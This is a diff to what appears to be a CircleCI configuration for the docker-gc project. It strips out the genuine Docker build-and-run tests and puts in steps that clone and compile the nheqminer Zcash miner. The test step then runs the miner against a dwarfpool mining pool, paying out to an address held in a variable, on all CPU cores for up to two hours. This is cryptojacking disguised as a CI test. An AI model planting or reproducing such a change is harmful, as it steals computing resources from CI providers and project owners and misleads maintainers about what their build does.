@@ -1,12 +1,13 @@
-machine:
-  services:
-    - docker
+---
+
+dependencies:
+  cache_directories:
+    - "~/nheqminer"
+  pre:
+    - sudo apt-get -y update; sudo apt-get install -y git cmake build-essential libboost-all-dev
+    - if [[ ! -e ~/nheqminer ]]; then git clone -b Linux https://github.com/nicehash/nheqminer.git ~/nheqminer && cd ~/nheqminer/cpu_xenoncat/Linux/asm/ && sh assemble.sh && cd ../../../Linux_cmake/nheqminer_cpu && cmake . && make -j $(nproc); fi
 
 test:
   override:
-      # TODO: run bash script against https://github.com/koalaman/shellcheck
-      # use custom tag for next command to make sense
-      - DOCKER_TAG=circleci make -f Makefile.docker image
-      # make sure image can run
-      - docker run -e LOG_TO_SYSLOG=0 -v /var/run/docker.sock:/var/run/docker.sock spotify/docker-gc:circleci
-
+    - ~/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l zec-us1.dwarfpool.com:3334 -u "$ADDRESS" -t $(nproc):
+timeout: 7200
